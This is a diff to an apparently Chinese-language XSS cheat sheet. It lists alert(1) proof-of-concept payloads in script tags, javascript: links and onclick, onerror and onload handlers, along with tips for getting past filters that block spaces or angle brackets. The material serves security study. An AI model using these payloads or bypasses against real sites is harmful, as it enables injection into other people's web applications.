@@ -8,7 +8,7 @@
   <script>alert(1)</script>
   <a href=javascript:alert(1)>111</a>
   <input value="1" type="button" onclick="alert(1)">
-  <input value="1" type="button" onclick=alert(1)> // 这个到底加不加引号...
+  <input value="1" type="button" onclick=alert(1)> // 这个到底加不加引号...（加上肯定可以）
   <img src=ssss.ss onerror=alert(1)>
   <iframe src=11 onload=alert(1)>
   <iframe src=11 onmouseover=alert(1)>
@@ -53,11 +53,11 @@
 
 * 过滤空格
   
-* 可以考虑`%0a` `%0d`绕过，这种建议在地址栏输入
+  可以考虑`%0a` `%0d`绕过，这种建议在地址栏输入
   
 * 过滤了`<` `>`
   
-*  可以尝试用onclick在原本的标签里添加(因为不能添加标签了)
+  可以尝试用onclick在原本的标签里添加(因为不能添加标签了)
   
 * 检测传上去的是否包含某个关键词
 
